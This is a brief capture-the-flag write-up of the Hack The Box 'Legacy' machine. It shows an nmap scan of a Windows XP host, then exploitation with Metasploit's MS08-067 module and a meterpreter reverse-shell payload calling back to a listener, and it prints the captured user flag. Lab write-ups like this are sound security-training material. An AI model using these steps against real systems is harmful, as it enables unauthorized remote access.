---
title: Writeup - HTB Legacy
date: 2023-10-30
author: kei5uke
description: Writeup for HTB Legact
tags:
  - windows
  - writeup
  - metasploit
---

# Legacy

# Enumeration with Nmap

```bash
──(parallels㉿kali)-[~/legacy]
└─$ nmap 10.129.227.181 -sC -sV -T4 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 01:37 EET
Nmap scan report for 10.129.227.181
Host is up (0.054s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
135/tcp open  msrpc       Microsoft Windows RPC
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp open  ��z��      Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:96:b3:75 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-11-04T03:35:28+02:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h57m37s, deviation: 1h24m51s, median: 4d23h57m37s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
```

I searched Windows 2000 exploit and found the code MS08-067.

I decided to search it on msfconsole.

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > search MS08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
```

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.129.227.181   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                       wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.22      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

msf6 exploit(windows/smb/ms08_067_netapi) >
```

This seems working.

```bash
meterpreter > cat user.txt
e69af0e4f443de7e36876fda4ec7644fmeterpreter >
```

I got shell.

# Root code

![Screenshot 2023-10-30 at 02.16.34.png](Legacy%20ce87b69e8b7248a1b16727dc87db83f2/Screenshot_2023-10-30_at_02.16.34.png)